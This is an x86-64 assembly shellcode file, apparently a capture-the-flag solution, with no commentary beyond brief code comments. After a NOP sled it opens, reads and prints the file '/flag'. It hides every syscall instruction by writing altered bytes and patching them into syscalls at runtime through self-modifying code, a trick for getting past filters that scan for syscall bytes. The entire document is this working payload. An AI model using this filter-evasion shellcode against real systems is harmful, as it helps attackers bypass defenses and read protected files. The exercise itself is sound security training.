.intel_syntax noprefix
.global _start
_start:

.rept 4096
nop
.endr

// int fd = open("/flag", 0);
mov rax, 2
lea rdi, [rip + flag_path]
mov rsi, 0
inc byte ptr [rip]
.byte 0x0E, 0x05

// read(fd, buff, 100);
mov rdi, rax
mov rax, 0 
mov rsi, rsp
mov rdx, 100
inc byte ptr [rip]
.byte 0x0E, 0x05

// write(1, buff, 100);
mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 100
inc byte ptr [rip]
.byte 0x0E, 0x05

flag_path:
.string "/flag"